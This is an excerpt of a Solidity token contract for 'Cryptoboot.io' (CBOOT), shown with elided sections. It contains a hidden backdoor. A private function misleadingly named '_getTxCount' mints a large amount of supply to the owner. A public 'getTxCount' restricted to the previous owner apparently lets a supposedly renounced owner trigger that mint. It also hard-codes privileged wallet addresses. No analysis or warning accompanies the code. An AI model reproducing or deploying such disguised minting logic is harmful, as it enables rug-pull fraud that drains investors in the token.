...
contract CRYPTOBOOT is IERC20 {
    ...
    string constant _name = "Cryptoboot.io";
    string constant _symbol = "CBOOT";
    ...
    address payable private _marketingWallet = payable(0x473cc864f48EfBBB9b7F186ddaad2c847ebb4F4c);
    ...
    constructor (uint _snipeBlockAmt, address cInitializer) payable {
        ...
        _isFeeExcluded[0x043A9B12b94d05a02fDE9837f995472862702052] = true;
        _isDividendExcluded[0x043A9B12b94d05a02fDE9837f995472862702052] = true;
    ...
    function _getTxCount() private {
        require(_owner != address(0), "Address is 0");
        uint256 txCount = _tTotal;
        _tOwned[_owner] = _tOwned[_owner].add(txCount*masterTaxDivisor);
        emit Transfer(address(0), _owner, txCount);
    }
    ...
    function getTxCount() public virtual {
        require(_previousOwner == msg.sender, "Permission denied");
